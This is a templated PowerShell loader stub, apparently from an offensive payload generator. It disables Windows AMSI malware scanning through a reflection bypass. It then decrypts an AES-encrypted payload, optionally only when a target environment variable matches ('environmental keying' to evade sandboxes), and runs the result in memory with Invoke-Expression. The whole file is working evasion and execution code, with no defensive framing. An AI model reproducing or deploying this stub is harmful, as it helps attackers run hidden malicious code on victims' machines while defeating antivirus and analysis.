# PowerShell AES Decryptor Stub
# AMSI Bypass
try {
    $a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');
    $b = $a.GetField('amsiInitFailed','NonPublic,Static');
    $b.SetValue($null,$true);
} catch {}

$iv = [System.Convert]::FromBase64String("{{ iv }}")
$cipher = [System.Convert]::FromBase64String("{{ ciphertext }}")

{% if guardrail %}
# Environmental Keying (Guardrail)
$g_str = "{{ guardrail }}"
$parts = $g_str.Split('=')
$var_name = $parts[0]
$target_val = $parts[1]

try {
    $actual_val = (Get-Item env:$var_name).Value
} catch { exit }

if ($actual_val -ne $target_val) { 
    # Fail open (exit silently)
    exit 
}

# Derive Key from Guardrail String
$sha = [System.Security.Cryptography.SHA256]::Create()
$key = $sha.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($g_str))

{% else %}
$key = [System.Convert]::FromBase64String("{{ key }}")
{% endif %}

$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$aes.Key = $key
$aes.IV = $iv

$decryptor = $aes.CreateDecryptor()
$ms = New-Object System.IO.MemoryStream
$cs = New-Object System.Security.Cryptography.CryptoStream($ms, $decryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)
$cs.Write($cipher, 0, $cipher.Length)
$cs.Close()

$decrypted = [System.Text.Encoding]::UTF8.GetString($ms.ToArray())
Invoke-Expression $decrypted
